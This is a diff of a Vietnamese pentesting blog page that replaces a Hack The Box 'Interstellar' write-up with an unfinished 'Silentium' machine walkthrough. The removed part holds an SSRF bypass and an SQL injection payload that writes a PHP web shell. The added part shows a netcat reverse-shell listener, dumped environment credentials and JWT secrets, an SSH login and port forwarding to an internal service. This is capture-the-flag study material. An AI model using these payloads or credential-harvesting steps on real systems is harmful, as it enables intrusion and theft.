@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://K4butoz.github.io/2026/04/13/htb-interstellar/"/>
+    <link rel="canonical" href="https://K4butoz.github.io/2026/04/30/htb/silentium/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -133,16 +133,16 @@
         
         <meta name="description" content="try with your all heart and soul">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[HTB] Interstellar">
-<meta property="og:url" content="https://k4butoz.github.io/2026/04/13/HTB-Interstellar/index.html">
+<meta property="og:title" content="[HTB] Silentium">
+<meta property="og:url" content="https://k4butoz.github.io/2026/04/30/HTB/Silentium/index.html">
 <meta property="og:site_name" content="Pentester Blog">
 <meta property="og:description" content="try with your all heart and soul">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://k4butoz.github.io/images/redefine-og.webp">
-<meta property="article:published_time" content="2026-04-13T17:08:02.000Z">
+<meta property="article:published_time" content="2026-04-30T06:09:34.000Z">
 <meta property="article:author" content="Redefine Team">
 <meta property="article:tag" content="HTB">
-<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Machine">
 <meta property="article:tag" content="vietnamese">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://k4butoz.github.io/images/redefine-og.webp">
@@ -157,7 +157,7 @@
     
     <title>
         
-            [HTB] Interstellar | Pentester Blog
+            [HTB] Silentium | Pentester Blog
         
     </title>
 
@@ -172,55 +172,49 @@
                 
                     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/base16/eva-min.min.css">
 <style> 
-  body .highlight-container {
-      border-radius: 12px !important;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.5) !important;
-      margin: 20px 0 !important;
-      background: #2d343d !important;
+  /* Ép màu nền và bo góc cho toàn bộ khối code */
+  body .highlight-container, 
+  body .highlight {
+      background: #2d343d !important; 
+      border-radius: 10px !important;
       border: none !important;
+      box-shadow: none !important;
+      margin: 1.5rem 0 !important;
+      overflow: hidden !important;
   }
-  body .highlight-container pre code.hljs {
+
+  /* Tinh chỉnh nội dung code bên trong */
+  body .highlight-container pre, 
+  body .highlight pre {
+      background: transparent !important;
+      margin: 0 !important;
+      padding: 0 !important;
+  }
+
+  body .highlight-container code.hljs,
+  body .highlight .code pre {
       background: transparent !important;
       color: #9fa7b3 !important;
-      padding: 1.2em !important;
+      padding: 1.5em !important;
       font-family: 'JetBrains Mono', monospace !important;
+      line-height: 1.6 !important;
+      display: block !important;
   }
-  body .highlight-container figcaption {
-      background: #23282f !important;
-      color: #1db5d6 !important;
-      font-weight: bold;
-      text-transform: uppercase;
-      font-size: 0.8rem;
-      border-bottom: 1px solid rgba(255,255,255,0.05) !important;
-  }
-  body .highlight-container .gutter {
+
+  /* Xóa bỏ thanh tiêu đề và số dòng triệt để */
+  body .highlight-container figcaption,
+  body .highlight .gutter {
       display: none !important;
   }
-  body .highlight-container .code {
-      padding-left: 20px !important;
+
+  /* Căn lề lại phần code chính */
+  body .highlight .code {
+      width: 100% !important;
+      padding: 0 !important;
   }
-  .home-article-meta-info .home-article-item.date,
-  .home-article-meta-info .home-article-date,
-  .home-article-meta-info i.fa-calendar,
-  .home-article-meta-info i.fa-calendar-days,
-  .article-meta-info .article-meta-item.date,
-  .article-meta-info .article-meta-item.updated,
-  .article-meta-info .article-meta-item i.fa-pen-nib,
-  .article-meta-info .article-meta-item i.fa-wrench {
-      display: none !important;
-  }
-  .article-title, .home-article-title {
-      font-size: 1.8rem !important;
-      line-height: 1.3 !important;
-  }
-  .article-meta-info, .home-article-meta-info {
-      justify-content: flex-start !important;
-      gap: 12px !important;
-  }
-  :root {
-    --primary-color: #1db5d6;
-    --background-color: #000000;
-  }
+  
+  /* Giữ nguyên phần Paginator của bạn */
+  .paginator span.current { color: #000 !important; background: #1db5d6 !important; }
   .paginator a.page-number,
   .paginator span.page-number,
   .paginator a.prev,
@@ -263,6 +257,8 @@
     <!--- Font Part-->
     
     
+        <link href="" rel="stylesheet">
+    
     
     
     
@@ -274,7 +270,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"k4butoz.github.io","root":"/","language":"en"};
-    window.theme = {"articles":{"post_meta":{"created_at":false,"updated_at":false},"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":false,"count":false,"min2read":false},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"default"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#1db5d6","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"side_tools":{"gear_rotation":false,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"try with your all heart and soul"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/PokemonSea1.webp"},"title":"I'm penetration tester","subtitle":{"text":["WELCOME =.="],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"center","links":{"github":"https://github.com/K4butoz?tab=repositories","instagram":null,"zhihu":null,"twitter":null,"email":"phong2312005@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Love Yourself","artist":null,"url":"/musics/riverflowsinyou.mp3","cover":"/images/lookChillChill.jpg","lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#27149b","right":"#367df7","transparency":10},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/EvanNotFound/hexo-theme-redefine","Blog":"https://ohevan.com","Friends":"/friends"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":false};
+    window.theme = {"articles":{"post_meta":{"created_at":false,"updated_at":false},"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":false,"count":false,"min2read":false},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"default","dark":"default"},"font":{"enable":true,"family":"JetBrains Mono","url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#1db5d6","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"side_tools":{"gear_rotation":false,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"try with your all heart and soul"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/PokemonSea1.webp"},"title":"I'm penetration tester","subtitle":{"text":["WELCOME =.="],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"center","links":{"github":"https://github.com/K4butoz?tab=repositories","instagram":null,"zhihu":null,"twitter":null,"email":"phong2312005@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Love Yourself","artist":null,"url":"/musics/riverflowsinyou.mp3","cover":"/images/lookChillChill.jpg","lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#27149b","right":"#367df7","transparency":10},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/EvanNotFound/hexo-theme-redefine","Blog":"https://ohevan.com","Friends":"/friends"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":false};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -643,7 +639,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -666,7 +662,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">[HTB] Interstellar</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">[HTB] Silentium</h1>
 			</div>
 			
 		</div>
@@ -685,8 +681,8 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2026-04-14 00:08:02</span>
-        <span class="mobile">2026-04-14 00:08:02</span>
+        <span class="desktop">2026-04-30 13:09:34</span>
+        <span class="mobile">2026-04-30 13:09:34</span>
         <span class="hover-info">Created</span>
     </span>
     
@@ -722,7 +718,7 @@
                     </li>
                 
                     <li>
-                        | <a href="/tags/Web/">Web</a>&nbsp;
+                        | <a href="/tags/Machine/">Machine</a>&nbsp;
                     </li>
                 
             </ul>
@@ -744,37 +740,37 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h2 id="Gioi-thieu"><a href="#Gioi-thieu" class="headerlink" title="Giới thiệu:"></a>Giới thiệu:</h2><p>Bài này gồm 2 lỗi: SQLi và SSRF, là 1 bài exploit chain  </p>
-<p>cấu trúc cây thư mục:</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└── challenge</span><br><span class="line">    ├── Dockerfile</span><br><span class="line">    ├── build_docker.sh</span><br><span class="line">    ├── entrypoint.sh</span><br><span class="line">    ├── flag.txt</span><br><span class="line">    ├── init.sql</span><br><span class="line">    └── src</span><br><span class="line">        ├── communicate.php</span><br><span class="line">        ├── images</span><br><span class="line">        │   └── background.png</span><br><span class="line">        ├── index.php</span><br><span class="line">        ├── js</span><br><span class="line">        │   └── sendForm.js</span><br><span class="line">        ├── login.php</span><br><span class="line">        ├── logout.php</span><br><span class="line">        ├── register.php</span><br><span class="line">        ├── templates</span><br><span class="line">        │   ├── communicate.tpl</span><br><span class="line">        │   ├── index.tpl</span><br><span class="line">        │   ├── login.tpl</span><br><span class="line">        │   └── register.tpl</span><br><span class="line">        └── utils</span><br><span class="line">            ├── database.php</span><br><span class="line">            ├── emoji.php</span><br><span class="line">            └── smarty.php</span><br></pre></td></tr></table></figure></div>
+			<h1 id="Gioi-thieu"><a href="#Gioi-thieu" class="headerlink" title="Giới thiệu"></a>Giới thiệu</h1><h1 id="Reconnaissance-Enumeration"><a href="#Reconnaissance-Enumeration" class="headerlink" title="Reconnaissance &amp; Enumeration"></a>Reconnaissance &amp; Enumeration</h1><p>~ ❯ curl -s -I <a class="link"   target="_blank" rel="noopener" href="http://10.129.33.203/" >http://10.129.33.203<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>HTTP&#x2F;1.1 301 Moved Permanently<br>Server: nginx&#x2F;1.24.0 (Ubuntu)<br>Date: Sat, 16 May 2026 05:40:08 GMT<br>Content-Type: text&#x2F;html<br>Content-Length: 178<br>Connection: keep-alive<br>Location: <a class="link"   target="_blank" rel="noopener" href="http://silentium.htb/" >http://silentium.htb/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>~ ❯ curl -s <a class="link"   target="_blank" rel="noopener" href="http://staging.silentium.htb/api/v1/version" >http://staging.silentium.htb/api/v1/version<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>{“version”:”3.0.5”}%      </p>
+<h2 id="Vhost-fuzzing"><a href="#Vhost-fuzzing" class="headerlink" title="Vhost fuzzing"></a>Vhost fuzzing</h2><h1 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h1><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">~ ❯ nc -lvnp 4444                                           ✘ INT 13m 57s<br>Listening on 0.0.0.0 4444<br></code></pre></td></tr></table></figure></div>
 
-<h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h2><p>Lỗ hổng SSRF tại communicate.php</p>
-<p>Hàm communicate.php nhận một tham số url và kiểm tra bằng Regex:<br>PHP</p>
-<p>if(preg_match(‘&#x2F;motherland.com$&#x2F;‘, $parsedUrl[‘host’]))</p>
-<p>Mục tiêu là truy cập index.php?action&#x3D;edit vốn chỉ dành cho 127.0.0.1. Tuy nhiên, sự khác biệt giữa cách PHP parse_url() xử lý và cách thư viện cURL thực thi URL cho phép ta bypass. Bằng cách sử dụng 0-scheme hoặc các ký tự đặc biệt như ;, ta có thể lừa server kết nối tới chính nó trong khi vẫn thỏa mãn điều kiện kết thúc bằng motherland.com.<br>Lỗ hổng SQL Injection tại init.sql</p>
-<p>Mặc dù PHP sử dụng Prepared Statements, nhưng logic trong Database lại bị hổng:<br>SQL</p>
-<p>CREATE PROCEDURE searchUser(IN name VARCHAR(255))<br>BEGIN<br>    SET @sql &#x3D; CONCAT(‘SELECT * FROM users WHERE name &#x3D; &#39;‘, name, ‘&#39;‘);<br>    PREPARE stmt FROM @sql;<br>    EXECUTE stmt;<br>END </p>
-<p>Tham số name được nối chuỗi trực tiếp (CONCAT). Nếu ta đổi tên người dùng (name) thành một đoạn mã SQL, khi trang index.php gọi thủ tục này, mã độc sẽ được thực thi.<br>Quyền hạn thư mục (Docker Analysis)</p>
-<p>Trong file Dockerfile, thư mục &#x2F;var&#x2F;www&#x2F;html được cấu hình với quyền ghi rất lỏng lẻo (chmod 777). Điều này cho phép user mysql ghi file trực tiếp vào thư mục web thông qua câu lệnh INTO OUTFILE.</p>
-<h2 id="Khai-Thac"><a href="#Khai-Thac" class="headerlink" title="Khai Thác"></a>Khai Thác</h2><p>Bước 1: Bypass SSRF để thay đổi tên</p>
-<p>Chúng ta không thể đăng ký tên chứa ký tự lạ vì register.php có filter Regex. Tuy nhiên, tính năng edit ở localhost thì không. Ta dùng Burp Suite gửi request tới communicate.php:</p>
-<p>Payload SSRF:</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL: 0://localhost:80;motherland.com:80/</span><br><span class="line"></span><br><span class="line">Data[action]: edit</span><br><span class="line"></span><br><span class="line">Data[new_name]: admin&#x27; UNION SELECT &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;,2,3,4,5 INTO OUTFILE &#x27;/var/www/html/shell.php&#x27; -- -</span><br></pre></td></tr></table></figure></div>
-<p>Bước 2: Kích hoạt SQL Injection</p>
-<p>Sau khi đổi tên thành công thông qua SSRF, “bom” SQL Injection đã nằm trong Database&#x2F;Session. Để kích hoạt, ta chỉ cần truy cập trang chủ:<br>GET &#x2F;index.php HTTP&#x2F;1.1</p>
-<p>Lúc này, server thực hiện CALL searchUser(‘payload…’). Dấu nháy đơn (‘) sẽ thoát khỏi câu lệnh gốc, thực hiện lệnh UNION SELECT và ghi file shell.php ra thư mục web.</p>
-<p>Bước 3: Thực thi mã từ xa (RCE)</p>
-<p>Bây giờ, file shell đã nằm trên server. Ta kiểm tra bằng cách liệt kê thư mục gốc  để tìm file flag có tên ngẫu nhiên:<br>GET &#x2F;shell.php?cmd&#x3D;ls &#x2F; HTTP&#x2F;1.1</p>
-<p>Sau khi tìm thấy file có tên dạng [hex]_flag.txt, ta dùng lệnh cat để đọc nội dung:<br>GET &#x2F;shell.php?cmd&#x3D;cat &#x2F;ab12cd34ef56gh78_flag.txt HTTP&#x2F;1.1</p>
-<h2 id="Tong-ket"><a href="#Tong-ket" class="headerlink" title="Tổng kết"></a>Tổng kết</h2><p>Để bài Lab này thành công, cần phải đi qua 3 cánh cửa</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">FLOWISE_PASSWORD=F1l3_d0ck3r<br>ALLOW_UNAUTHORIZED_CERTS=true<br>NODE_VERSION=20.19.4<br>HOSTNAME=c78c3cceb7ba<br>YARN_VERSION=1.22.22<br>SMTP_PORT=1025<br>SHLVL=3<br>PORT=3000<br>HOME=/root<br>SENDER_EMAIL=ben@silentium.htb<br>PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser<br>JWT_ISSUER=ISSUER<br>JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD<br>LLM_PROVIDER=nvidia-nim<br>SMTP_USERNAME=test<br>SMTP_SECURE=false<br>JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200<br>FLOWISE_USERNAME=ben<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>DATABASE_PATH=/root/.flowise<br>JWT_TOKEN_EXPIRY_IN_MINUTES=360<br>JWT_AUDIENCE=AUDIENCE<br>SECRETKEY_PATH=/root/.flowise<br>PWD=/<br>SMTP_PASSWORD=r04D!!_R4ge<br>NVIDIA_NIM_LLM_MODE=managed<br>SMTP_HOST=mailhog<br>JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD<br>SMTP_USER=test<br></code></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">~ ❯ ssh -i ~/.ssh/id_ed25519 ben@silentium.htb               ✘ 255 2m 46s<br>ben@silentium.htb&#x27;s password: <br>Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/pro<br><br> System information as of Sat May 16 09:00:52 AM UTC 2026<br><br>  System load:           0.07<br>  Usage of /:            82.9% of 13.37GB<br>  Memory usage:          19%<br>  Swap usage:            0%<br>  Processes:             233<br>  Users logged in:       0<br>  IPv4 address for eth0: 10.129.33.203<br>  IPv6 address for eth0: dead:beef::250:56ff:feb9:37c0<br><br><br>Expanded Security Maintenance for Applications is not enabled.<br><br>0 updates can be applied immediately.<br><br>1 additional security update can be applied with ESM Apps.<br>Learn more about enabling ESM Apps service at https://ubuntu.com/esm<br><br><br>The list of available updates is more than a week old.<br>To check for new updates run: sudo apt update<br>Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5<br>ben@silentium:~$ cat ~/user.txt<br>e33a083f22f1294d682760ea64f1e887<br></code></pre></td></tr></table></figure></div>
+
+<h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><h1 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h1><p>ben@silentium:<del>$ sudo -l<br>[sudo] password for ben:<br>Sorry, user ben may not run sudo on silentium.<br>ben@silentium:</del>$ ss -tulp<br>Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:Port Process<br>udp   UNCONN 0      0         127.0.0.54:domain      0.0.0.0:*<br>udp   UNCONN 0      0      127.0.0.53%lo:domain      0.0.0.0:*<br>udp   UNCONN 0      0            0.0.0.0:bootpc      0.0.0.0:*<br>tcp   LISTEN 0      4096      127.0.0.54:domain      0.0.0.0:*<br>tcp   LISTEN 0      4096       127.0.0.1:3001        0.0.0.0:*<br>tcp   LISTEN 0      4096       127.0.0.1:3000        0.0.0.0:*<br>tcp   LISTEN 0      4096       127.0.0.1:32977       0.0.0.0:*<br>tcp   LISTEN 0      4096       127.0.0.1:8025        0.0.0.0:*<br>tcp   LISTEN 0      511          0.0.0.0:http        0.0.0.0:*<br>tcp   LISTEN 0      4096         0.0.0.0:ssh         0.0.0.0:*<br>tcp   LISTEN 0      4096       127.0.0.1:1025        0.0.0.0:*<br>tcp   LISTEN 0      4096   127.0.0.53%lo:domain      0.0.0.0:*<br>tcp   LISTEN 0      511             [::]:http           [::]:*<br>tcp   LISTEN 0      4096            [::]:ssh            [::]:*  </p>
+<p>ssh-keygen -t ed25519<br>Generating public&#x2F;private ed25519 key pair.<br>Enter file in which to save the key (&#x2F;home&#x2F;phongnhh&#x2F;.ssh&#x2F;id_ed25519):<br>Enter passphrase for “&#x2F;home&#x2F;phongnhh&#x2F;.ssh&#x2F;id_ed25519” (empty for no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved in &#x2F;home&#x2F;phongnhh&#x2F;.ssh&#x2F;id_ed25519<br>Your public key has been saved in &#x2F;home&#x2F;phongnhh&#x2F;.ssh&#x2F;id_ed25519.pub<br>The key fingerprint is:<br>SHA256:zkw3o+7rOuc+dUu0nvHGIvKNIMD4bOHg+BvSSjp2FXQ phongnhh@archlinux<br>The key’s randomart image is:<br>+–[ED25519 256]–+<br>|                 |<br>|     . E         |<br>|    . .          |<br>|   o .      .    |<br>|  o + . S +. .   |<br>| + &#x3D; + &#x3D; o.o&#x3D;    |<br>|o.+ * . *. + *   |<br>|+&#x3D; +  .o+..o&#x3D; +  |<br>|+.+.  .OB&#x3D;o..o   |<br>+—-[SHA256]—–+</p>
+<p>~ ❯ cat ~&#x2F;.ssh&#x2F;id_ed25519.pub     8s<br>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDMZ28CRNoU9KkdnWpoZtXRmT&#x2F;WhVtrn706QYDv612P+ phongnhh@archlinux</p>
+<hr>
+<p> ❯ ssh -L 3001:127.0.0.1:3001 <a class="link"   href="mailto:&#98;&#x65;&#110;&#x40;&#x73;&#105;&#108;&#101;&#x6e;&#116;&#x69;&#x75;&#x6d;&#x2e;&#x68;&#116;&#x62;" >ben@silentium.htb<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="mailto:&#x62;&#x65;&#110;&#x40;&#x73;&#x69;&#x6c;&#101;&#x6e;&#x74;&#105;&#117;&#109;&#x2e;&#104;&#116;&#98;" >ben@silentium.htb<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>‘s password:<br>Welcome to Ubuntu 24.04.4 LTS (GNU&#x2F;Linux 6.8.0-107-generic x86_64)</p>
 <ul>
-<li><p>SSRF: Để đóng vai người nhà (localhost) và tiếp cận hàm edit</p>
-</li>
-<li><p>SQLi: Để cấy mã độc vào câu truy vấn của Database</p>
-</li>
-<li><p>File System: Để Database ghi mã độc đó thành một file có thể truy cập được từ bên ngoài</p>
-</li>
+<li>Documentation:  <a class="link"   target="_blank" rel="noopener" href="https://help.ubuntu.com/" >https://help.ubuntu.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li>Management:     <a class="link"   target="_blank" rel="noopener" href="https://landscape.canonical.com/" >https://landscape.canonical.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li>Support:        <a class="link"   target="_blank" rel="noopener" href="https://ubuntu.com/pro" >https://ubuntu.com/pro<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
 </ul>
+<p> System information as of Sat May 16 09:20:55 AM UTC 2026</p>
+<p>  System load:           0.0<br>  Usage of &#x2F;:            83.0% of 13.37GB<br>  Memory usage:          19%<br>  Swap usage:            0%<br>  Processes:             236<br>  Users logged in:       1<br>  IPv4 address for eth0: 10.129.33.203<br>  IPv6 address for eth0: dead:beef::250:56ff:feb9:37c0</p>
+<p>Expanded Security Maintenance for Applications is not enabled.</p>
+<p>0 updates can be applied immediately.</p>
+<p>1 additional security update can be applied with ESM Apps.<br>Learn more about enabling ESM Apps service at <a class="link"   target="_blank" rel="noopener" href="https://ubuntu.com/esm" >https://ubuntu.com/esm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>The list of available updates is more than a week old.<br>To check for new updates run: sudo apt update<br>Failed to connect to <a class="link"   target="_blank" rel="noopener" href="https://changelogs.ubuntu.com/meta-release-lts" >https://changelogs.ubuntu.com/meta-release-lts<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Check your Internet connection or proxy settings</p>
+<p>Last login: Sat May 16 09:00:53 2026 from 10.10.16.175<br>ben@silentium:~$ curl -I <a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:3001/" >http://127.0.0.1:3001<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>HTTP&#x2F;1.1 200 OK<br>Content-Type: text&#x2F;html; charset&#x3D;UTF-8<br>Set-Cookie: lang&#x3D;en-US; Path&#x3D;&#x2F;; Max-Age&#x3D;2147483647<br>Set-Cookie: i_like_gogs&#x3D;9285b9acb620be5e; Path&#x3D;&#x2F;; HttpOnly<br>Set-Cookie: _csrf&#x3D;K3tt9PEqDgyj31dcymf0G7l_lg86MTc3ODkyMzI2NDU3NzExODI0Mw; Path&#x3D;&#x2F;; Domain&#x3D;staging-v2-code.dev.silentium.htb; Expires&#x3D;Sun, 17 May 2026 09:21:04 GMT; HttpOnly<br>X-Content-Type-Options: nosniff<br>X-Frame-Options: deny<br>Date: Sat, 16 May 2026 09:21:04 GMT</p>
